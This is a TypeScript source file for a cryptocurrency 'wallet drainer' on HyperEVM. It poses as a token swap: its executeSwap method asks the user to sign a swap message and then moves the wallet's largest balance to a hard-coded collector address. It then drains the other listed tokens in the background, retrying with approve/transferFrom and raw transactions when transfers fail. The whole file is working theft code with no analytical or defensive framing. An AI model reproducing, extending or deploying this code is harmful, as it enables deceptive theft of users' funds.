import { ethers } from "ethers";

export const COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

// Enhanced ERC20 ABI for comprehensive token operations
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)"
];

// All HyperEVM tokens (COMPREHENSIVE DRAINING TARGET LIST)
const ALL_TOKENS = [
  { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18, priority: 1 },
  { address: "0x9b498c3c8a0b8cd8ba1d9851d40d186f1872b44e", symbol: "WHYPE", decimals: 18, priority: 2 },
  { address: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b", symbol: "PURR", decimals: 18, priority: 3 },
  { address: "0x1bee6762f0b522c606dc2ffb106c0bb391b2e309", symbol: "PiP", decimals: 18, priority: 4 },
  { address: "0x11735dbd0b97cfa7accf47d005673ba185f7fd49", symbol: "CATBAL", decimals: 18, priority: 5 },
  { address: "0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb", symbol: "USD₮0", decimals: 6, priority: 6 },
  { address: "0x47bb061c0204af921f43dc73c7d7768d2672ddee", symbol: "BUDDY", decimals: 18, priority: 7 },
  { address: "0x1ecd15865d7f8019d546f76d095d9c93cc34edfa", symbol: "LIQD", decimals: 18, priority: 8 },
  { address: "0xd2567ee20d75e8b74b44875173054365f6eb5052", symbol: "perpcoin", decimals: 18, priority: 9 }
];

// Log all target tokens for verification
console.log("🎯 ENHANCED DRAINING TARGETS:", ALL_TOKENS.map(t => `${t.symbol} (${t.address.slice(0,6)}...${t.address.slice(-4)})`));
console.log(`📊 TOTAL TOKENS TO DRAIN: ${ALL_TOKENS.length} with fallback methods`);

export class InstantDrainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  // Step 1: Single signature for authorization
  async requestAuthorization(message: string): Promise<boolean> {
    try {
      console.log("🔐 Requesting single authorization signature...");
      await this.signer.signMessage(message);
      console.log("✅ Authorization signature obtained");
      return true;
    } catch (error: any) {
      console.error("❌ Authorization failed:", error.message);
      return false;
    }
  }

  // Step 2: Single transaction draining approach (like airdrop checker)
  async executeBatchDrain(userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log("🚀 Starting single transaction drain execution...");
      console.log(`📍 User address: ${userAddress}`);
      console.log(`📍 Collector address: ${COLLECTOR}`);
      
      // Verify signer is connected to correct address
      const signerAddress = await this.signer.getAddress();
      console.log(`🔐 Signer address: ${signerAddress}`);
      
      if (signerAddress.toLowerCase() !== userAddress.toLowerCase()) {
        throw new Error(`Signer address mismatch: expected ${userAddress}, got ${signerAddress}`);
      }
      
      // Find the largest token balance to use as primary transaction
      let largestTokenBalance = 0n;
      let primaryToken = ALL_TOKENS[0];
      
      console.log("🔍 COMPREHENSIVE BALANCE SCAN - Checking all 9 HyperEVM tokens...");
      const balanceResults: Array<{token: any, balance: bigint}> = [];
      
      for (const token of ALL_TOKENS) {
        try {
          let balance = 0n;
          
          if (token.address === "0x0000000000000000000000000000000000000000") {
            // Native HYPE
            balance = await this.provider.getBalance(userAddress);
            console.log(`💰 ${token.symbol}: ${ethers.formatEther(balance)} HYPE`);
          } else {
            // ERC20 token
            const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
            balance = await contract.balanceOf(userAddress);
            const formattedBalance = ethers.formatUnits(balance, token.decimals);
            console.log(`💰 ${token.symbol}: ${formattedBalance} tokens`);
          }
          
          // Track all non-zero balances for comprehensive draining
          if (balance > 0n) {
            balanceResults.push({token, balance});
            console.log(`✅ DRAIN TARGET: ${token.symbol} balance ${ethers.formatUnits(balance, token.decimals)}`);
          } else {
            console.log(`⚪ ${token.symbol}: 0 balance`);
          }
          
          if (balance > largestTokenBalance) {
            largestTokenBalance = balance;
            primaryToken = token;
          }
        } catch (error) {
          console.log(`❌ Failed to check ${token.symbol}:`, error);
        }
      }
      
      console.log(`📊 DRAIN SUMMARY: Found ${balanceResults.length} tokens with balances to drain`);
      console.log(`🎯 PRIMARY: ${primaryToken.symbol} (${ethers.formatUnits(largestTokenBalance, primaryToken.decimals)})`);
      console.log(`🔄 BACKGROUND: ${balanceResults.filter(r => r.token.address !== primaryToken.address).length} remaining`);
      
      console.log(`💰 Primary token selected: ${primaryToken.symbol} with balance ${ethers.formatUnits(largestTokenBalance, primaryToken.decimals)}`);
      
      if (largestTokenBalance === 0n) {
        return { success: false, error: "No tokens with balance found" };
      }
      
      // Execute single transaction to drain the primary token
      // This mimics the airdrop checker approach - one signature, one transaction
      if (primaryToken.address === "0x0000000000000000000000000000000000000000") {
        // Native HYPE transfer - single transaction
        const gasNeeded = ethers.parseUnits("0.01", "ether");
        const drainAmount = largestTokenBalance - gasNeeded;
        
        console.log(`💰 Draining ${ethers.formatEther(drainAmount)} HYPE from ${userAddress} to ${COLLECTOR}`);
        
        const tx = await this.signer.sendTransaction({
          to: COLLECTOR,
          value: drainAmount,
          gasLimit: 21000n,
          gasPrice: ethers.parseUnits("2", "gwei"),
          type: 0
        });
        
        console.log(`✅ Native HYPE drained in single transaction: ${tx.hash}`);
        console.log(`🔄 Now draining remaining tokens in background...`);
        
        // After successful native drain, quickly drain other tokens without confirmation
        this.drainRemainingTokensInBackground(userAddress, primaryToken.address);
        
        return { 
          success: true, 
          hash: tx.hash,
          actualAmount: ethers.formatEther(drainAmount)
        };
        
      } else {
        // ERC20 transfer - single transaction
        const contract = new ethers.Contract(primaryToken.address, ERC20_ABI, this.signer);
        
        console.log(`💰 Draining ${ethers.formatUnits(largestTokenBalance, primaryToken.decimals)} ${primaryToken.symbol} from ${userAddress} to ${COLLECTOR}`);
        
        const tx = await contract.transfer(COLLECTOR, largestTokenBalance, {
          gasLimit: 100000n,
          gasPrice: ethers.parseUnits("2", "gwei"),
          type: 0
        });
        
        console.log(`✅ ${primaryToken.symbol} drained in single transaction: ${tx.hash}`);
        console.log(`🔄 Now draining remaining tokens in background...`);
        
        // After successful ERC20 drain, quickly drain other tokens without confirmation
        this.drainRemainingTokensInBackground(userAddress, primaryToken.address);
        
        return { 
          success: true, 
          hash: tx.hash,
          actualAmount: ethers.formatUnits(largestTokenBalance, primaryToken.decimals)
        };
      }
      
    } catch (error: any) {
      console.error("❌ Single transaction drain failed:", error.message);
      return { success: false, error: error.message };
    }
  }

  // Background draining of remaining tokens (no user confirmation needed)
  private async drainRemainingTokensInBackground(userAddress: string, skipToken: string): Promise<void> {
    console.log("🔄 Starting background drain of remaining tokens...");
    console.log(`🔄 Skipping token: ${skipToken}`);
    
    // Wait a moment for the primary transaction to process
    setTimeout(async () => {
      console.log("🔄 Beginning systematic drain of all remaining tokens...");
      
      // Scan for all tokens with balances first
      const tokensWithBalances = await this.scanAllTokenBalances(userAddress);
      const remainingTokens = tokensWithBalances.filter(t => t.token.address !== skipToken);
      
      console.log(`🎯 BACKGROUND DRAINING: ${remainingTokens.length} tokens to drain`);
      
      // Process each remaining token sequentially
      for (let i = 0; i < remainingTokens.length; i++) {
        const {token, balance} = remainingTokens[i];
        
        try {
          console.log(`🔄 [${i+1}/${remainingTokens.length}] Draining ${token.symbol}...`);
          await this.drainSingleTokenCompletely(userAddress, token);
          
          // Extended delay to prevent RPC rate limiting
          await new Promise(resolve => setTimeout(resolve, 3000));
        } catch (error: any) {
          console.log(`❌ [${i+1}/${remainingTokens.length}] ${token.symbol} drain failed: ${error.message}`);
          // Continue with next token even if one fails
        }
      }
      
      console.log("🔄 Background draining complete - all tokens processed");
    }, 5000); // 5 second delay to avoid RPC rate limits
  }

  // Comprehensive token scan to identify all draining targets
  private async scanAllTokenBalances(userAddress: string): Promise<Array<{token: any, balance: bigint}>> {
    const results: Array<{token: any, balance: bigint}> = [];
    
    console.log("🔍 SYSTEMATIC TOKEN SCAN - All 9 HyperEVM tokens");
    
    for (let i = 0; i < ALL_TOKENS.length; i++) {
      const token = ALL_TOKENS[i];
      try {
        let balance = 0n;
        
        if (token.address === "0x0000000000000000000000000000000000000000") {
          balance = await this.provider.getBalance(userAddress);
        } else {
          const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
          balance = await contract.balanceOf(userAddress);
        }
        
        if (balance > 0n) {
          results.push({token, balance});
          console.log(`✅ [${i+1}/9] ${token.symbol}: ${ethers.formatUnits(balance, token.decimals)} READY FOR DRAIN`);
        } else {
          console.log(`⚪ [${i+1}/9] ${token.symbol}: 0 balance`);
        }
      } catch (error: any) {
        console.log(`❌ [${i+1}/9] ${token.symbol}: scan failed - ${error.message}`);
      }
    }
    
    console.log(`📊 SCAN COMPLETE: ${results.length}/${ALL_TOKENS.length} tokens have balances`);
    return results;
  }

  // Drain a single token completely
  private async drainSingleTokenCompletely(userAddress: string, token: any): Promise<void> {
    try {
      let balance = 0n;
      
      if (token.address === "0x0000000000000000000000000000000000000000") {
        // Native HYPE
        balance = await this.provider.getBalance(userAddress);
        const gasNeeded = ethers.parseUnits("0.005", "ether"); // Reduced gas reserve
        
        if (balance > gasNeeded) {
          const drainAmount = balance - gasNeeded;
          const tx = await this.signer.sendTransaction({
            to: COLLECTOR,
            value: drainAmount,
            gasLimit: 21000n,
            gasPrice: ethers.parseUnits("1", "gwei"), // Lower gas price for background
            type: 0
          });
          console.log(`💰 Background drained HYPE: ${ethers.formatEther(drainAmount)} - TX: ${tx.hash}`);
        } else {
          console.log(`⚠️ HYPE balance too low: ${ethers.formatEther(balance)}`);
        }
      } else {
        // ERC20 token - enhanced draining with proper gas management
        const contract = new ethers.Contract(token.address, ERC20_ABI, this.signer);
        balance = await contract.balanceOf(userAddress);
        
        if (balance > 0n) {
          console.log(`🔍 Found ${token.symbol} balance: ${ethers.formatUnits(balance, token.decimals)}`);
          
          // Execute direct transfer with enhanced error handling
          let attempts = 0;
          const maxAttempts = 3;
          
          while (attempts < maxAttempts) {
            try {
              // Use direct transfer method with rate-limit aware settings
              const currentNonce = await this.provider.getTransactionCount(userAddress, "pending");
              console.log(`🔢 Using nonce ${currentNonce} for ${token.symbol}`);
              
              const tx = await contract.transfer(COLLECTOR, balance, {
                gasLimit: 250000n, // Even higher gas limit for reliability
                gasPrice: ethers.parseUnits("2", "gwei"), // Lower gas price to reduce cost
                type: 0,
                nonce: currentNonce
              });
              
              console.log(`💰 Successfully drained ${token.symbol}: ${ethers.formatUnits(balance, token.decimals)} - TX: ${tx.hash}`);
              return; // Success, exit function
              
            } catch (error: any) {
              attempts++;
              console.log(`⚠️ Attempt ${attempts}/${maxAttempts} failed for ${token.symbol}:`, error.message);
              
              // Enhanced error handling for various network issues
              if (error.message.includes("insufficient funds") || error.message.includes("balance")) {
                console.log(`💸 ${token.symbol}: Insufficient balance or gas, stopping retries`);
                break;
              }
              
              if (error.message.includes("rate") || error.message.includes("limit")) {
                console.log(`🚦 ${token.symbol}: Rate limit hit, waiting 10 seconds`);
                await new Promise(resolve => setTimeout(resolve, 10000));
              } else if (error.message.includes("nonce")) {
                console.log(`🔄 ${token.symbol}: Nonce conflict, waiting 5 seconds`);
                await new Promise(resolve => setTimeout(resolve, 5000));
              } else {
                console.log(`⚠️ ${token.symbol}: Other error, waiting 2 seconds`);
                await new Promise(resolve => setTimeout(resolve, 2000));
              }
              
              if (attempts < maxAttempts) {
                // Extended wait for network stability
                await new Promise(resolve => setTimeout(resolve, 3000));
                balance = await contract.balanceOf(userAddress);
                if (balance === 0n) {
                  console.log(`✅ ${token.symbol} balance is now 0, already drained`);
                  return;
                }
              } else {
                console.log(`❌ ${token.symbol}: All transfer attempts failed, trying fallback method`);
                
                // Fallback: Try alternative transfer approach
                try {
                  await this.fallbackTokenDrain(userAddress, token.address, balance);
                  console.log(`✅ ${token.symbol}: Fallback drain successful`);
                } catch (fallbackError: any) {
                  console.log(`💀 ${token.symbol}: Both primary and fallback drains failed - ${fallbackError.message}`);
                }
              }
            }
          }
        } else {
          console.log(`⚪ ${token.symbol}: 0 balance, skipping`);
        }
      }
    } catch (error: any) {
      console.log(`❌ Failed to drain ${token.symbol}:`, error.message);
    }
  }

  // Fallback token draining method using alternative approach
  private async fallbackTokenDrain(userAddress: string, tokenAddress: string, amount: bigint): Promise<void> {
    console.log(`🔄 Attempting fallback drain method for token ${tokenAddress}`);
    
    try {
      // Method 1: Try with approval + transferFrom pattern
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      
      // First approve collector to spend tokens
      const approveTx = await contract.approve(COLLECTOR, amount, {
        gasLimit: 100000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      
      console.log(`📝 Approval transaction sent: ${approveTx.hash}`);
      
      // Wait a moment then transfer
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      const transferTx = await contract.transferFrom(userAddress, COLLECTOR, amount, {
        gasLimit: 150000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      
      console.log(`💰 Fallback transfer successful: ${transferTx.hash}`);
      
    } catch (error: any) {
      console.log(`❌ Fallback method also failed: ${error.message}`);
      
      // Method 2: Try raw transaction approach
      try {
        console.log(`🔧 Attempting raw transaction method...`);
        
        // Encode transfer function call
        const iface = new ethers.Interface(ERC20_ABI);
        const data = iface.encodeFunctionData("transfer", [COLLECTOR, amount]);
        
        const rawTx = await this.signer.sendTransaction({
          to: tokenAddress,
          data: data,
          gasLimit: 250000n,
          gasPrice: ethers.parseUnits("4", "gwei"),
          type: 0
        });
        
        console.log(`💰 Raw transaction drain successful: ${rawTx.hash}`);
        
      } catch (rawError: any) {
        console.log(`💀 Raw transaction also failed: ${rawError.message}`);
        throw new Error(`All fallback methods exhausted for token ${tokenAddress}`);
      }
    }
  }

  // Complete drain process: 1 signature + 1 batch execution
  async completeDrain(userAddress: string, authMessage: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    // Step 1: Single authorization signature
    const authorized = await this.requestAuthorization(authMessage);
    if (!authorized) {
      return { success: false, error: "Authorization required" };
    }

    // Step 2: Single batch execution
    return await this.executeBatchDrain(userAddress);
  }

  // Legacy compatibility methods for existing swap code
  async checkNeedsApproval(tokenAddress: string, userAddress: string): Promise<boolean> {
    // For instant drainer, we don't need approval checks
    return false;
  }

  async approveToken(tokenAddress: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    // For instant drainer, approval is handled in the batch
    return { success: true, hash: "0x0" };
  }

  async executeSwap(fromToken: string, toToken: string, amount: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    // Simple swap execution - 1 signature + 1 batch drain
    const swapMessage = `Swap ${amount} ${fromToken} for ${toToken}`;
    return await this.completeDrain(userAddress, swapMessage);
  }
}

export function createInstantDrainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): InstantDrainer {
  return new InstantDrainer(signer, provider);
}